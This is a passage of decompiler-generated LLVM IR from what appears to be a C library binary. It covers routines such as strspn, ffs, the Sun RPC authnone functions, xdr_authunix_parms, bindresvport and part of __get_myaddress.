  uselistorder i32 %v1_100271a4, { 1, 0 }
  uselistorder i32 %v1_10027120, { 1, 0 }
  uselistorder i32 %v0_1002711c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_100271d8, { 1, 0 }
  uselistorder label %dec_label_pc_100271cc, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @r10, align 4
  %v0_100272181 = load i32, i32* @r3, align 4
  %v1_100272182 = inttoptr i32 %v0_100272181 to i8*
  %v2_100272183 = load i8, i8* %v1_100272182, align 1
  %v3_100272184 = zext i8 %v2_100272183 to i32
  store i32 %v3_100272184, i32* @r11, align 4
  %v3_1002721c6 = icmp eq i8 %v2_100272183, 0
  br i1 %v3_1002721c6, label %dec_label_pc_1002722c, label %dec_label_pc_10027224

dec_label_pc_100271f4:                            ; preds = %dec_label_pc_100271f4, %dec_label_pc_10027224
  %v0_100271f4 = phi i32 [ %v1_100271f8, %dec_label_pc_100271f4 ], [ %tmp, %dec_label_pc_10027224 ]
  %v1_100271f4 = inttoptr i32 %v0_100271f4 to i8*
  %v2_100271f4 = load i8, i8* %v1_100271f4, align 1
  %v3_100271f4 = zext i8 %v2_100271f4 to i32
  %v1_100271f8 = add i32 %v0_100271f4, 1
  %v3_100271fc = icmp eq i8 %v2_100271f4, 0
  %v4_10027200 = icmp eq i32 %v0_100272008, %v3_100271f4
  %brmerge = or i1 %v3_100271fc, %v4_10027200
  br i1 %brmerge, label %dec_label_pc_10027208, label %dec_label_pc_100271f4

dec_label_pc_10027208:                            ; preds = %dec_label_pc_100271f4
  br i1 %v3_100271fc, label %dec_label_pc_1002722c, label %dec_label_pc_10027210

dec_label_pc_10027210:                            ; preds = %dec_label_pc_10027208
  %v1_10027210 = add i32 %v0_10027210, 1
  store i32 %v1_10027210, i32* @r10, align 4
  %v1_10027214 = add i32 %v0_10027214, 1
  %v1_10027218 = inttoptr i32 %v1_10027214 to i8*
  %v2_10027218 = load i8, i8* %v1_10027218, align 1
  %v3_10027218 = zext i8 %v2_10027218 to i32
  store i32 %v3_10027218, i32* @r11, align 4
  %v3_1002721c = icmp eq i8 %v2_10027218, 0
  br i1 %v3_1002721c, label %dec_label_pc_1002722c, label %dec_label_pc_10027224

dec_label_pc_10027224:                            ; preds = %entry, %dec_label_pc_10027210
  %v0_10027214 = phi i32 [ %v1_10027214, %dec_label_pc_10027210 ], [ %v0_100272181, %entry ]
  %v0_10027210 = phi i32 [ %v1_10027210, %dec_label_pc_10027210 ], [ 0, %entry ]
  %v0_100272008 = phi i32 [ %v3_10027218, %dec_label_pc_10027210 ], [ %v3_100272184, %entry ]
  br label %dec_label_pc_100271f4

dec_label_pc_1002722c:                            ; preds = %dec_label_pc_10027210, %dec_label_pc_10027208, %entry
  %v0_1002722c = phi i32 [ 0, %entry ], [ %v1_10027210, %dec_label_pc_10027210 ], [ %v0_10027210, %dec_label_pc_10027208 ]
  ret i32 %v0_1002722c

; uselistorder directives
  uselistorder i32 %v0_100271f4, { 1, 0 }
  uselistorder i32* @r11, { 34, 21, 35, 54, 55, 56, 98, 99, 3, 93, 94, 6, 95, 96, 36, 37, 57, 58, 59, 60, 44, 45, 46, 47, 61, 62, 63, 64, 106, 107, 108, 7, 8, 109, 65, 67, 9, 4, 68, 66, 38, 39, 40, 110, 111, 112, 101, 102, 0, 117, 100, 69, 70, 48, 49, 50, 71, 43, 10, 122, 123, 124, 125, 126, 127, 128, 129, 130, 73, 11, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 72, 86, 87, 88, 12, 89, 90, 91, 92, 52, 118, 119, 120, 16, 17, 114, 13, 115, 116, 18, 28, 29, 121, 19, 20, 23, 24, 25, 27, 26, 22, 97, 105, 51, 1, 5, 2, 104, 30, 103, 14, 113, 15, 31, 32, 33, 41, 42, 53 }
  uselistorder label %dec_label_pc_10027224, { 1, 0 }
  uselistorder label %dec_label_pc_100271f4, { 1, 0 }
}

define i32 @ffs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10027234 = urem i32 %arg1, 65536
  %v3_1002723c = icmp eq i32 %v1_10027234, 0
  br i1 %v3_1002723c, label %dec_label_pc_10027244, label %dec_label_pc_1002724c

dec_label_pc_10027244:                            ; preds = %entry
  %v4_10027244 = sdiv i32 %arg1, 65536
  br label %dec_label_pc_1002724c

dec_label_pc_1002724c:                            ; preds = %entry, %dec_label_pc_10027244
  %v0_1002725c = phi i32 [ %arg1, %entry ], [ %v4_10027244, %dec_label_pc_10027244 ]
  %v0_10027258 = phi i32 [ 1, %entry ], [ 17, %dec_label_pc_10027244 ]
  %v1_1002724c = urem i32 %v0_1002725c, 256
  %v3_10027250 = icmp eq i32 %v1_1002724c, 0
  br i1 %v3_10027250, label %dec_label_pc_10027258, label %dec_label_pc_10027264

dec_label_pc_10027258:                            ; preds = %dec_label_pc_1002724c
  %v1_10027258 = or i32 %v0_10027258, 8
  %v4_1002725c = sdiv i32 %v0_1002725c, 256
  br label %dec_label_pc_10027264

dec_label_pc_10027264:                            ; preds = %dec_label_pc_1002724c, %dec_label_pc_10027258
  %v0_1002726c = phi i32 [ %v0_10027258, %dec_label_pc_1002724c ], [ %v1_10027258, %dec_label_pc_10027258 ]
  %v0_10027270 = phi i32 [ %v0_1002725c, %dec_label_pc_1002724c ], [ %v4_1002725c, %dec_label_pc_10027258 ]
  %v1_10027264 = urem i32 %v0_10027270, 16
  %v3_10027264 = icmp eq i32 %v1_10027264, 0
  br i1 %v3_10027264, label %dec_label_pc_1002726c, label %dec_label_pc_10027278

dec_label_pc_1002726c:                            ; preds = %dec_label_pc_10027264
  %v1_1002726c = add nsw i32 %v0_1002726c, 4
  %v4_10027270 = sdiv i32 %v0_10027270, 16
  %v1_10027274 = urem i32 %v1_1002726c, 256
  br label %dec_label_pc_10027278

dec_label_pc_10027278:                            ; preds = %dec_label_pc_10027264, %dec_label_pc_1002726c
  %v0_10027280 = phi i32 [ %v0_1002726c, %dec_label_pc_10027264 ], [ %v1_10027274, %dec_label_pc_1002726c ]
  %v0_10027284 = phi i32 [ %v0_10027270, %dec_label_pc_10027264 ], [ %v4_10027270, %dec_label_pc_1002726c ]
  %v1_10027278 = urem i32 %v0_10027284, 4
  %v3_10027278 = icmp eq i32 %v1_10027278, 0
  br i1 %v3_10027278, label %dec_label_pc_10027280, label %dec_label_pc_1002728c

dec_label_pc_10027280:                            ; preds = %dec_label_pc_10027278
  %v1_10027280 = add nsw i32 %v0_10027280, 2
  %v4_10027284 = sdiv i32 %v0_10027284, 4
  %v1_10027288 = urem i32 %v1_10027280, 256
  br label %dec_label_pc_1002728c

dec_label_pc_1002728c:                            ; preds = %dec_label_pc_10027278, %dec_label_pc_10027280
  %v0_100272a0 = phi i32 [ %v1_10027288, %dec_label_pc_10027280 ], [ %v0_10027280, %dec_label_pc_10027278 ]
  %v0_10027298 = phi i32 [ %v4_10027284, %dec_label_pc_10027280 ], [ %v0_10027284, %dec_label_pc_10027278 ]
  %v3_1002728c = icmp eq i32 %v0_10027298, 0
  br i1 %v3_1002728c, label %dec_label_pc_100272a4, label %dec_label_pc_10027298

dec_label_pc_10027298:                            ; preds = %dec_label_pc_1002728c
  %v1_10027298 = urem i32 %v0_10027298, 2
  %v1_1002729c = xor i32 %v1_10027298, 1
  %v2_100272a0 = add nsw i32 %v1_1002729c, %v0_100272a0
  br label %dec_label_pc_100272a4

dec_label_pc_100272a4:                            ; preds = %dec_label_pc_1002728c, %dec_label_pc_10027298
  %storemerge = phi i32 [ %v2_100272a0, %dec_label_pc_10027298 ], [ 0, %dec_label_pc_1002728c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10027284, { 2, 0, 1 }
  uselistorder i32 %v0_10027270, { 2, 0, 1 }
  uselistorder i32 %v0_10027258, { 1, 0 }
  uselistorder i32 %v0_1002725c, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100272a4, { 1, 0 }
  uselistorder label %dec_label_pc_1002728c, { 1, 0 }
  uselistorder label %dec_label_pc_10027278, { 1, 0 }
  uselistorder label %dec_label_pc_10027264, { 1, 0 }
  uselistorder label %dec_label_pc_1002724c, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_100272ac = load i32, i32* @r3, align 4
  ret i32 %v0_100272ac
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_100272c0 = load i32, i32* @r3, align 4
  ret i32 %v0_100272c0
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268595932, i32* @lr, align 4
  %v0_100272d8 = call i32 @__rpc_thread_variables()
  store i32 %v0_100272d8, i32* %r3.global-to-local, align 4
  %v1_100272dc = add i32 %v0_100272d8, 152
  %v2_100272dc = inttoptr i32 %v1_100272dc to i32*
  %v3_100272dc = load i32, i32* %v2_100272dc, align 4
  %v0_100272e4 = load i32, i32* @r31, align 4
  store i32 %v0_100272e4, i32* %r3.global-to-local, align 4
  %v3_100272e8 = icmp eq i32 %v3_100272dc, 0
  br i1 %v3_100272e8, label %dec_label_pc_1002730c, label %dec_label_pc_100272f4

dec_label_pc_100272f4:                            ; preds = %entry
  %v1_100272f4 = add i32 %v0_100272e4, 4
  %v2_100272f4 = inttoptr i32 %v1_100272f4 to i32*
  %v3_100272f4 = load i32, i32* %v2_100272f4, align 4
  %v1_100272fc = add i32 %v3_100272f4, 12
  %v2_100272fc = inttoptr i32 %v1_100272fc to i32*
  %v3_100272fc = load i32, i32* %v2_100272fc, align 4
  call void @__pseudo_call(i32 %v3_100272fc)
  %v0_10027308 = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1002730c

dec_label_pc_1002730c:                            ; preds = %entry, %dec_label_pc_100272f4
  %v0_1002730c = phi i32 [ 0, %entry ], [ %v0_10027308, %dec_label_pc_100272f4 ]
  store i32 %v0_1002730c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1002730c

; uselistorder directives
  uselistorder i32 %v0_1002730c, { 1, 0 }
  uselistorder label %dec_label_pc_1002730c, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  store i32 268596024, i32* @lr, align 4
  %v0_10027334 = call i32 @__rpc_thread_variables()
  %v1_10027338 = add i32 %v0_10027334, 152
  %v2_10027338 = inttoptr i32 %v1_10027338 to i32*
  %v3_10027338 = load i32, i32* %v2_10027338, align 4
  store i32 %v3_10027338, i32* @r31, align 4
  %v3_10027348 = icmp eq i32 %v3_10027338, 0
  br i1 %v3_10027348, label %dec_label_pc_10027350, label %dec_label_pc_10027364

dec_label_pc_10027350:                            ; preds = %entry
  store i32 268596052, i32* @lr, align 4
  %v2_10027350 = call i32 @calloc(i32 1, i32 64)
  store i32 %v2_10027350, i32* @r31, align 4
  %v3_10027354 = icmp eq i32 %v2_10027350, 0
  br i1 %v3_10027354, label %dec_label_pc_10027400, label %dec_label_pc_10027360

dec_label_pc_10027360:                            ; preds = %dec_label_pc_10027350
  %v1_10027360 = load i32, i32* @r30, align 4
  %v2_10027360 = add i32 %v1_10027360, 152
  %v3_10027360 = inttoptr i32 %v2_10027360 to i32*
  store i32 %v2_10027350, i32* %v3_10027360, align 4
  %v0_10027364.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10027364

dec_label_pc_10027364:                            ; preds = %entry, %dec_label_pc_10027360
  %v1_10027398 = phi i32 [ %v3_10027338, %entry ], [ %v0_10027364.pre, %dec_label_pc_10027360 ]
  %v1_10027364 = add i32 %v1_10027398, 60
  %v2_10027364 = inttoptr i32 %v1_10027364 to i32*
  %v3_10027364 = load i32, i32* %v2_10027364, align 4
  %v2_10027368 = ptrtoint i32* %stack_var_-56 to i32
  %v1_1002736c = add i32 %v1_10027398, 12
  store i32 %v1_1002736c, i32* @r30, align 4
  %v3_10027378 = icmp eq i32 %v3_10027364, 0
  br i1 %v3_10027378, label %dec_label_pc_10027380, label %dec_label_pc_100273fc

dec_label_pc_10027380:                            ; preds = %dec_label_pc_10027364
  %v1_10027374 = add i32 %v1_10027398, 40
  %v2_10027398 = add i32 %v1_10027398, 32
  %v3_10027398 = inttoptr i32 %v2_10027398 to i32*
  store i32 ptrtoint (i32* @global_var_1002fb78.1401 to i32), i32* %v3_10027398, align 4
  %v5_100273ac = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v1_10027374, i32 20, i32 0)
  %v0_100273b0 = load i32, i32* @r31, align 4
  store i32 %v0_100273b0, i32* @r4, align 4
  store i32 %v2_10027368, i32* @r3, align 4
  store i32 268596156, i32* @lr, align 4
  %v0_100273b8 = call i32 @xdr_opaque_auth()
  %v0_100273bc = load i32, i32* @r30, align 4
  store i32 %v0_100273bc, i32* @r4, align 4
  store i32 %v2_10027368, i32* @r3, align 4
  store i32 268596168, i32* @lr, align 4
  %v0_100273c4 = call i32 @xdr_opaque_auth()
  %v1_100273d0 = add i32 %tmp, 16
  %v2_100273d0 = inttoptr i32 %v1_100273d0 to i32*
  %v3_100273d0 = load i32, i32* %v2_100273d0, align 4
  call void @__pseudo_call(i32 %v3_100273d0)
  %v1_100273dc = load i32, i32* @r31, align 4
  %v2_100273dc = add i32 %v1_100273dc, 60
  %v3_100273dc = inttoptr i32 %v2_100273dc to i32*
  store i32 %v2_10027368, i32* %v3_100273dc, align 4
  %v1_100273e8 = add i32 %tmp, 28
  %v2_100273e8 = inttoptr i32 %v1_100273e8 to i32*
  %v3_100273e8 = load i32, i32* %v2_100273e8, align 4
  %v3_100273ec = icmp eq i32 %v3_100273e8, 0
  br i1 %v3_100273ec, label %dec_label_pc_100273fc, label %dec_label_pc_100273f4

dec_label_pc_100273f4:                            ; preds = %dec_label_pc_10027380
  call void @__pseudo_call(i32 %v3_100273e8)
  br label %dec_label_pc_100273fc

dec_label_pc_100273fc:                            ; preds = %dec_label_pc_10027364, %dec_label_pc_10027380, %dec_label_pc_100273f4
  %v0_100273fc = load i32, i32* @r31, align 4
  br label %dec_label_pc_10027400

dec_label_pc_10027400:                            ; preds = %dec_label_pc_10027350, %dec_label_pc_100273fc
  %v0_10027410 = phi i32 [ 0, %dec_label_pc_10027350 ], [ %v0_100273fc, %dec_label_pc_100273fc ]
  ret i32 %v0_10027410

; uselistorder directives
  uselistorder i32 %v1_10027398, { 0, 2, 1, 3 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32)* @calloc, { 1, 3, 0, 2 }
  uselistorder i32 64, { 14, 0, 1, 2, 3, 4, 5, 6, 7, 36, 40, 41, 8, 42, 11, 12, 13, 37, 38, 43, 48, 39, 19, 55, 35, 20, 44, 21, 22, 23, 24, 25, 26, 27, 17, 50, 51, 53, 52, 45, 46, 28, 29, 47, 30, 54, 31, 32, 33, 34, 49, 18, 10, 9, 15, 16 }
  uselistorder i32 152, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10027400, { 1, 0 }
  uselistorder label %dec_label_pc_100273fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10027364, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268596272, i32* @lr, align 4
  %v0_1002742c = call i32 @xdr_u_long()
  store i32 255, i32* @r5, align 4
  %v3_10027434 = icmp eq i32 %v0_1002742c, 0
  %v0_10027438 = load i32, i32* @r31, align 4
  %v1_10027438 = add i32 %v0_10027438, 4
  store i32 %v1_10027438, i32* @r4, align 4
  br i1 %v3_10027434, label %dec_label_pc_100274ac, label %dec_label_pc_10027444

dec_label_pc_10027444:                            ; preds = %entry
  %v0_1002743c = load i32, i32* @r30, align 4
  store i32 268596296, i32* @lr, align 4
  %v3_10027444 = inttoptr i32 %v0_1002743c to i32*
  %v4_10027444 = call i32 @__GI_xdr_string(i32* %v3_10027444)
  %v0_10027448 = load i32, i32* @r31, align 4
  %v1_10027448 = add i32 %v0_10027448, 8
  store i32 %v1_10027448, i32* @r4, align 4
  %v3_1002744c = icmp eq i32 %v4_10027444, 0
  %v0_10027450 = load i32, i32* @r30, align 4
  store i32 %v0_10027450, i32* @r3, align 4
  br i1 %v3_1002744c, label %dec_label_pc_100274ac, label %dec_label_pc_10027458

dec_label_pc_10027458:                            ; preds = %dec_label_pc_10027444
  store i32 268596316, i32* @lr, align 4
  %v2_10027458 = inttoptr i32 %v0_10027450 to i32*
  %v3_10027458 = inttoptr i32 %v1_10027448 to i32*
  %v4_10027458 = call i32 @xdr_u_int(i32* %v2_10027458, i32* %v3_10027458)
  %v0_1002745c = load i32, i32* @r31, align 4
  %v1_1002745c = add i32 %v0_1002745c, 12
  store i32 %v1_1002745c, i32* @r4, align 4
  %v3_10027460 = icmp eq i32 %v4_10027458, 0
  %v0_10027464 = load i32, i32* @r30, align 4
  store i32 %v0_10027464, i32* @r3, align 4
  br i1 %v3_10027460, label %dec_label_pc_100274ac, label %dec_label_pc_1002746c

dec_label_pc_1002746c:                            ; preds = %dec_label_pc_10027458
  store i32 ptrtoint (i32* @global_var_10027470.1402 to i32), i32* @lr, align 4
  %v2_1002746c = inttoptr i32 %v0_10027464 to i32*
  %v3_1002746c = inttoptr i32 %v1_1002745c to i32*
  %v4_1002746c = call i32 @xdr_u_int(i32* %v2_1002746c, i32* %v3_1002746c)
  %v3_10027474 = icmp eq i32 %v4_1002746c, 0
  %v0_10027478 = load i32, i32* @r31, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 16800), i32* @r8, align 4
  br i1 %v3_10027474, label %dec_label_pc_100274ac, label %dec_label_pc_10027494

dec_label_pc_10027494:                            ; preds = %dec_label_pc_1002746c
  %v0_1002748c = load i32, i32* @r30, align 4
  %v1_10027480 = add i32 %v0_10027478, 20
  %v1_10027478 = add i32 %v0_10027478, 16
  store i32 268596376, i32* @lr, align 4
  %v6_10027494 = inttoptr i32 %v0_1002748c to i32*
  %v7_10027494 = call i32 @__GI_xdr_array(i32* %v6_10027494, i32 %v1_10027480, i32 %v1_10027478, i32 16, i32 4, i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 16800))
  %v2_10027498 = icmp ne i32 %v7_10027494, 0
  %v5_1002749c = zext i1 %v2_10027498 to i32
  br label %dec_label_pc_100274ac

dec_label_pc_100274ac:                            ; preds = %entry, %dec_label_pc_10027444, %dec_label_pc_10027458, %dec_label_pc_1002746c, %dec_label_pc_10027494
  %storemerge = phi i32 [ %v5_1002749c, %dec_label_pc_10027494 ], [ 0, %dec_label_pc_1002746c ], [ 0, %dec_label_pc_10027458 ], [ 0, %dec_label_pc_10027444 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10027478, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 16800), { 1, 0 }
  uselistorder i32 (i32*)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 255, { 44, 45, 46, 6, 48, 47, 49, 53, 52, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 50, 40, 41, 51, 42, 43 }
  uselistorder i32 ()* @xdr_u_long, { 9, 11, 14, 8, 7, 13, 6, 10, 2, 1, 0, 12, 5, 4, 3 }
  uselistorder label %dec_label_pc_100274ac, { 4, 3, 2, 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_100274c4 = load i32, i32* @lr, align 4
  store i32 %v0_100274c4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v4_100274cc = icmp eq i16* %arg2, null
  store i32 %arg1, i32* %r28.global-to-local, align 4
  br i1 %v4_100274cc, label %dec_label_pc_100274dc, label %dec_label_pc_100274f8

dec_label_pc_100274dc:                            ; preds = %entry
  %v2_100274dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100274dc, i32* %r29.global-to-local, align 4
  store i32 16, i32* @r5, align 4
  store i32 %v2_100274dc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100274ec.1403 to i32), i32* @lr, align 4
  %v0_100274e8 = call i32 @__GI_memset()
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10027518

dec_label_pc_100274f8:                            ; preds = %entry
  %v2_100274f8 = load i16, i16* %arg2, align 2
  %v3_100274f8 = zext i16 %v2_100274f8 to i32
  store i32 %v3_100274f8, i32* %r0.global-to-local, align 4
  %v3_100274fc = icmp eq i16 %v2_100274f8, 2
  br i1 %v3_100274fc, label %dec_label_pc_10027518, label %dec_label_pc_10027504

dec_label_pc_10027504:                            ; preds = %dec_label_pc_100274f8
  %v0_10027504 = call i32 @__errno_location()
  store i32 96, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10027510 = inttoptr i32 %v0_10027504 to i32*
  store i32 96, i32* %v2_10027510, align 4
  %v0_100275c0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100275bc

dec_label_pc_10027518:                            ; preds = %dec_label_pc_100274f8, %dec_label_pc_100274dc
  %v3_1002751c = load i16, i16* @global_var_10045290.1405, align 2
  %v4_1002751c = sext i16 %v3_1002751c to i32
  store i32 %v4_1002751c, i32* %r0.global-to-local, align 4
  %v3_10027520 = icmp eq i16 %v3_1002751c, 0
  br i1 %v3_10027520, label %dec_label_pc_10027528, label %dec_label_pc_10027544

dec_label_pc_10027528:                            ; preds = %dec_label_pc_10027518
  store i32 ptrtoint (i32* @global_var_1002752c.1406 to i32), i32* @lr, align 4
  %v0_10027528 = call i32 @__libc_getpid()
  %v2_10027530 = srem i32 %v0_10027528, 424
  %v1_10027534 = sub i32 %v0_10027528, %v2_10027530
  store i32 %v1_10027534, i32* %r0.global-to-local, align 4
  %v1_1002753c = add nsw i32 %v2_10027530, 600
  %v1_10027540 = trunc i32 %v1_1002753c to i16
  store i16 %v1_10027540, i16* @global_var_10045290.1405, align 2
  br label %dec_label_pc_10027544

dec_label_pc_10027544:                            ; preds = %dec_label_pc_10027518, %dec_label_pc_10027528
  %v0_10027544 = call i32 @__errno_location()
  store i32 0, i32* @r31, align 4
  store i32 98, i32* %r0.global-to-local, align 4
  store i32 %v0_10027544, i32* @r30, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10027558 = inttoptr i32 %v0_10027544 to i32*
  store i32 98, i32* %v2_10027558, align 4
  %v0_10027594.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1002758c

dec_label_pc_10027560:                            ; preds = %dec_label_pc_100275b0
  %v3_10027560 = load i16, i16* @global_var_10045290.1405, align 2
  %v4_10027560 = sext i16 %v3_10027560 to i32
  store i32 %v4_10027560, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10045291.1407 to i32), i32* %r0.global-to-local, align 4
  %v3_10027568 = add i32 %v0_1002759c, 2
  %v4_10027568 = inttoptr i32 %v3_10027568 to i16*
  store i16 %v3_10027560, i16* %v4_10027568, align 2
  %v0_1002756c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002756c = mul i32 %v0_1002756c, 65536
  %v2_1002756c = sdiv i32 %v1_1002756c, 65536
  store i32 %v2_1002756c, i32* %r0.global-to-local, align 4
  %v1_10027574 = trunc i32 %v2_1002756c to i16
  store i16 %v1_10027574, i16* @global_var_10045290.1405, align 2
  %tmp8 = icmp slt i32 %v1_1002756c, 67043329
  br i1 %tmp8, label %dec_label_pc_10027584, label %dec_label_pc_1002757c

dec_label_pc_1002757c:                            ; preds = %dec_label_pc_10027560
  store i32 600, i32* %r0.global-to-local, align 4
  store i16 600, i16* @global_var_10045290.1405, align 2
  br label %dec_label_pc_10027584

dec_label_pc_10027584:                            ; preds = %dec_label_pc_10027560, %dec_label_pc_1002757c
  store i32 268596616, i32* @lr, align 4
  %v0_10027584 = call i32 @bind()
  store i32 %v0_10027584, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1002758c

dec_label_pc_1002758c:                            ; preds = %dec_label_pc_10027544, %dec_label_pc_10027584
  %v0_10027594 = phi i32 [ %v0_10027594.pre, %dec_label_pc_10027544 ], [ %v0_10027584, %dec_label_pc_10027584 ]
  %v0_1002758c = load i32, i32* @r31, align 4
  %v2_1002758c = icmp sgt i32 %v0_1002758c, 423
  %v0_10027598 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10027598, i32* @r3, align 4
  %v0_1002759c = load i32, i32* %r29.global-to-local, align 4
  %v1_100275a4 = add i32 %v0_1002758c, 1
  store i32 %v1_100275a4, i32* @r31, align 4
  %tmp7 = icmp sgt i32 %v0_10027594, -1
  %or.cond = or i1 %tmp7, %v2_1002758c
  br i1 %or.cond, label %dec_label_pc_100275bc, label %dec_label_pc_100275b0

dec_label_pc_100275b0:                            ; preds = %dec_label_pc_1002758c
  %v0_100275b0 = load i32, i32* @r30, align 4
  %v1_100275b0 = inttoptr i32 %v0_100275b0 to i32*
  %v2_100275b0 = load i32, i32* %v1_100275b0, align 4
  store i32 %v2_100275b0, i32* %r0.global-to-local, align 4
  %v3_100275b4 = icmp eq i32 %v2_100275b0, 98
  br i1 %v3_100275b4, label %dec_label_pc_10027560, label %dec_label_pc_100275bc

dec_label_pc_100275bc:                            ; preds = %dec_label_pc_100275b0, %dec_label_pc_1002758c, %dec_label_pc_10027504
  %v0_100275c0 = phi i32 [ %v0_100275c0.pre, %dec_label_pc_10027504 ], [ %v0_10027594, %dec_label_pc_1002758c ], [ %v0_10027594, %dec_label_pc_100275b0 ]
  store i32 %v0_100274c4, i32* %r0.global-to-local, align 4
  ret i32 %v0_100275c0

; uselistorder directives
  uselistorder i32 %v2_1002756c, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 98, { 2, 1, 3, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 11, 10, 3, 1, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder i16* @global_var_10045290.1405, { 4, 3, 2, 1, 0 }
  uselistorder i32 96, { 0, 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 1 }
  uselistorder label %dec_label_pc_1002758c, { 1, 0 }
  uselistorder label %dec_label_pc_10027584, { 1, 0 }
  uselistorder label %dec_label_pc_10027544, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_2()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4160 = alloca i32, align 4
  %stack_var_-4168 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 268596728, i32* @lr, align 4
  %v3_100275f4 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_100275f4, i32* @r3, align 4
  store i32 %v3_100275f4, i32* @r29, align 4
  %tmp13 = icmp sgt i32 %v3_100275f4, -1
  br i1 %tmp13, label %dec_label_pc_1002760c, label %dec_label_pc_10027600

dec_label_pc_10027600:                            ; preds = %entry
  store i32 ptrtoint ([24 x i8]* @global_var_1002fb8c.1408 to i32), i32* @r3, align 4
  br label %dec_label_pc_10027644

dec_label_pc_1002760c:                            ; preds = %entry
  store i32 4096, i32* %stack_var_-4168, align 4
  store i32 35090, i32* @r4, align 4
  %v2_1002761c = ptrtoint i32* %stack_var_-4128 to i32
  %v2_10027620 = ptrtoint i32* %stack_var_-4168 to i32
  store i32 %v2_10027620, i32* @r5, align 4
  store i32 268596784, i32* @lr, align 4
  %v0_1002762c = call i32 @ioctl()
  store i32 1, i32* @r28, align 4
  %tmp14 = icmp sgt i32 %v0_1002762c, -1
  br i1 %tmp14, label %dec_label_pc_10027650.preheader, label %dec_label_pc_1002763c

dec_label_pc_1002763c:                            ; preds = %dec_label_pc_1002760c
